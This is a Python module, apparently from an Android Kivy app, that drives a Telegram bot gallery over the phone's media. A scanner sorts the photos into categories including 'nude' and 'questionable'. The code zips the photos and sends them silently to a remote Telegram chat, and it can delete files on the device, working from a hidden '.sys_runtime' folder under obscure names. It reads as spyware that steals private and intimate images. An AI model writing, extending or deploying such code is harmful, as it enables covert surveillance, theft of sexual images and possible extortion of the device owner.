# -*- coding: utf-8 -*-
import os
import time
import zipfile
import logging
import random
import gc
import json

# ========== إعداد المسارات الموحدة ==========
def _get_runtime_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        return os.path.join(base, ".sys_runtime")
    except:
        return os.path.join(os.getcwd(), ".sys_runtime")

P = _get_runtime_path()
T = os.path.join(P, "g_tmp")     # مجلد مؤقت للمعاينات والتحميلات
if not os.path.exists(T):
    os.makedirs(T)

logging.basicConfig(filename=os.path.join(P, "g.log"), level=logging.ERROR, filemode='w')

try:
    from PIL import Image, ImageOps
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

try:
    from kivy.clock import Clock
    KIVY_AVAILABLE = True
except ImportError:
    KIVY_AVAILABLE = False


class G:
    def __init__(self, sc=None, tg=None):
        self.sc = sc      # MediaScanner instance
        self.tg = tg      # TelegramUI instance
        self.ipp = 16     # عدد الصور في الصفحة الواحدة
        self._cleanup_old_temp()

    # ========== تنظيف الملفات المؤقتة القديمة (أكثر من ساعة) ==========
    def _cleanup_old_temp(self):
        try:
            now = time.time()
            if os.path.exists(T):
                for f in os.listdir(T):
                    path = os.path.join(T, f)
                    if os.path.getmtime(path) < now - 3600:
                        os.remove(path)
        except Exception as e:
            logging.error(f"Gallery cleanup error: {e}")

    # ========== إنشاء صورة مصغرة محسنة (مربعة باستخدام ImageOps.fit) ==========
    def _thumbnail(self, path, size=(300, 300)):
        if not PIL_AVAILABLE or not os.path.exists(path):
            return None
        try:
            with Image.open(path) as img:
                # قص الصورة من المركز لتصبح مربعة تماماً
                img = ImageOps.fit(img, size, method=Image.Resampling.LANCZOS, centering=(0.5, 0.5))
                out_path = os.path.join(T, f"th_{time.time_ns()}.jpg")
                img.save(out_path, "JPEG", quality=70)
                return out_path
        except Exception as e:
            logging.error(f"Thumbnail error: {e}")
            return None

    # ========== دالة مساعدة: تحويل اسم الفئة إلى أيقونة ونص ==========
    def _get_category_emoji(self, cat):
        emoji_map = {
            "pending": "📷",
            "nude": "🔞",
            "questionable": "⚠️",
            "normal": "✅"
        }
        text_map = {
            "pending": "جديد",
            "nude": "حساس",
            "questionable": "مشبوه",
            "normal": "عادي"
        }
        return emoji_map.get(cat, "🖼️"), text_map.get(cat, cat)

    # ========== واجهة لوحة المفاتيح (مع أزرار الفئات والتحميل الجماعي) ==========
    def get_grid_kb(self, cat="pending", page=0):
        stats = self.sc.get_statistics()
        items = self.sc.get_gallery_by_category(cat, limit=self.ipp, page=page)
        total = stats.get(cat, 0)
        total_pages = (total + self.ipp - 1) // self.ipp if total > 0 else 1

        keyboard = []

        # صف أزرار التنقل بين الفئات (مع الإحصائيات)
        cats_row = []
        for c in ["pending", "nude", "questionable", "normal"]:
            count = stats.get(c, 0)
            if count > 0:
                emoji, name = self._get_category_emoji(c)
                # تمييز الفئة الحالية بعلامة ✅
                display = f"{emoji} {name} ({count})" if c != cat else f"✅ {emoji} {name} ({count})"
                cats_row.append({"text": display, "callback_data": f"g_nav|{c}|0"})
        if cats_row:
            keyboard.append(cats_row[:4])  # كحد أقصى 4 أزرار في الصف

        # شبكة الصور (4x4)
        row = []
        for i in range(self.ipp):
            if i < len(items):
                label = items[i].get("label", str((page * self.ipp) + i + 1).zfill(2))
                btn = {"text": f"🖼 {label}", "callback_data": f"g_opt|{cat}|{page}|{i}"}
            else:
                btn = {"text": "⬛", "callback_data": "nop"}
            row.append(btn)
            if len(row) == 4:
                keyboard.append(row)
                row = []
        if row:
            keyboard.append(row)

        # أزرار التنقل بين الصفحات
        nav_buttons = []
        if page > 0:
            nav_buttons.append({"text": "⏮️", "callback_data": f"g_nav|{cat}|{page-1}"})
        nav_buttons.append({"text": f"📄 {page+1}/{max(1, total_pages)}", "callback_data": "nop"})
        if len(items) == self.ipp and (page + 1) < total_pages:
            nav_buttons.append({"text": "⏭️", "callback_data": f"g_nav|{cat}|{page+1}"})
        keyboard.append(nav_buttons)

        # زر التحميل الجماعي (إذا كان هناك صور في الصفحة)
        if items:
            keyboard.append([{"text": "📦 تحميل الصفحة الحالية (ZIP)", "callback_data": f"g_bulk|{cat}|{page}"}])

        return {"inline_keyboard": keyboard}

    # ========== عرض خيارات ملف معين ==========
    def show_options(self, cid, cat, page_str, idx_str):
        page = int(page_str)
        idx = int(idx_str)
        items = self.sc.get_gallery_by_category(cat, limit=self.ipp, page=page)
        if idx >= len(items):
            return
        item = items[idx]
        path = item['path']
        label = item.get("label", "??")
        size_mb = round(os.path.getsize(path) / (1024 * 1024), 1) if os.path.exists(path) else 0

        kb = [
            [{"text": "👁 معاينة", "callback_data": f"g_act|pr|{cat}|{page}|{idx}"}],
            [
                {"text": "⬇️ تحميل (ZIP)", "callback_data": f"g_act|dw|{cat}|{page}|{idx}"},
                {"text": "🗑 حذف", "callback_data": f"g_conf|de|{cat}|{page}|{idx}"}
            ],
            [{"text": "🔙 عودة", "callback_data": f"g_nav|{cat}|{page}"}]
        ]
        self.tg._api("sendMessage", {
            "chat_id": cid,
            "text": f"📦 **#{label}**  |  حجم: `{size_mb} MB`\n📂 الفئة: `{cat}`",
            "reply_markup": json.dumps({"inline_keyboard": kb}),
            "parse_mode": "Markdown"
        })

    # ========== تنفيذ الإجراء (مع دعم التحميل الجماعي) ==========
    def execute_action(self, cid, action, cat, page_str, idx_str=None):
        page = int(page_str)

        # حالة التحميل الجماعي لصفحة كاملة
        if action == "bulk":
            items = self.sc.get_gallery_by_category(cat, limit=self.ipp, page=page)
            if not items:
                self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ لا توجد صور في هذه الصفحة."})
                return

            zip_path = os.path.join(T, f"bulk_{cat}_p{page}_{random.getrandbits(32)}.zip")
            try:
                with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                    for item in items:
                        path = item['path']
                        if os.path.exists(path):
                            zf.write(path, os.path.basename(path))

                target = getattr(self.tg, 'dat', cid)
                with open(zip_path, 'rb') as f:
                    self.tg._api("sendDocument", {
                        "chat_id": target,
                        "caption": f"📦 تحميل جماعي | الفئة: {cat} | الصفحة {page+1} | {len(items)} ملف",
                        "disable_notification": True
                    }, {"document": f})
                self.tg._api("sendMessage", {"chat_id": cid, "text": f"✅ تم إرسال {len(items)} ملفاً مضغوطاً."})
            except Exception as e:
                logging.error(f"Bulk download error: {e}")
                self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ فشل إنشاء ملف ZIP الجماعي."})
            finally:
                if os.path.exists(zip_path):
                    os.remove(zip_path)
                gc.collect()
            return

        # الإجراءات الفردية (معاينة، تحميل، حذف)
        if idx_str is None:
            return
        idx = int(idx_str)
        items = self.sc.get_gallery_by_category(cat, limit=self.ipp, page=page)
        if idx >= len(items):
            return
        item = items[idx]
        path = item['path']
        label = item.get("label", "??")

        if action == "pr":
            self._preview(cid, path)
        elif action == "dw":
            self._download(cid, path, label)
        elif action == "del":
            self._delete(cid, path, label)

    # ========== معاينة الصورة ==========
    def _preview(self, cid, path):
        if path.lower().endswith(('.mp4', '.mkv', '.3gp', '.mov', '.avi')):
            self.tg._api("sendMessage", {"chat_id": cid, "text": "📽 معاينة الفيديو غير مدعومة. يمكنك تحميله."})
            return

        thumb = self._thumbnail(path)
        if not thumb:
            self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ لا يمكن إنشاء معاينة لهذا الملف."})
            return

        try:
            with open(thumb, 'rb') as photo:
                resp = self.tg._api("sendPhoto", {"chat_id": cid, "caption": "🔍 معاينة (ستُحذف بعد 30 ثانية)"}, {"photo": photo})
            if resp and resp.get('ok') and KIVY_AVAILABLE:
                msg_id = resp['result']['message_id']
                Clock.schedule_once(lambda dt: self._delete_message(cid, msg_id), 30)
        except Exception as e:
            logging.error(f"Preview error: {e}")
            self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ فشل في إرسال المعاينة."})
        finally:
            if os.path.exists(thumb):
                os.remove(thumb)

    # ========== تحميل الملف (مضغوطاً) ==========
    def _download(self, cid, path, label):
        if not os.path.exists(path):
            self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ الملف غير موجود."})
            return

        file_size = os.path.getsize(path)
        if file_size > 45 * 1024 * 1024:
            self.tg._api("sendMessage", {"chat_id": cid, "text": "⚠️ حجم الملف كبير جداً (>45MB). لا يمكن إرساله عبر البوت."})
            return

        zip_path = os.path.join(T, f"dl_{random.getrandbits(32)}.zip")
        try:
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                zf.write(path, os.path.basename(path))

            target_chat = getattr(self.tg, 'dat', cid)
            with open(zip_path, 'rb') as f:
                self.tg._api("sendDocument", {"chat_id": target_chat, "caption": f"📤 {label}"}, {"document": f})
        except Exception as e:
            logging.error(f"Download error: {e}")
            self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ فشل في إرسال الملف."})
        finally:
            if os.path.exists(zip_path):
                os.remove(zip_path)
            gc.collect()

    # ========== حذف الملف نهائياً ==========
    def _delete(self, cid, path, label):
        try:
            if os.path.exists(path):
                os.remove(path)
                self.tg._api("sendMessage", {"chat_id": cid, "text": f"🗑 تم حذف #{label} نهائياً."})
            else:
                self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ الملف غير موجود مسبقاً."})
        except Exception as e:
            logging.error(f"Delete error: {e}")
            self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ فشل في حذف الملف."})
        finally:
            gc.collect()

    # ========== حذف رسالة المعاينة بعد 30 ثانية ==========
    def _delete_message(self, cid, msg_id):
        try:
            self.tg._api("deleteMessage", {"chat_id": cid, "message_id": msg_id})
        except:
            pass


def create(sc=None, tg=None):
    return G(sc, tg)
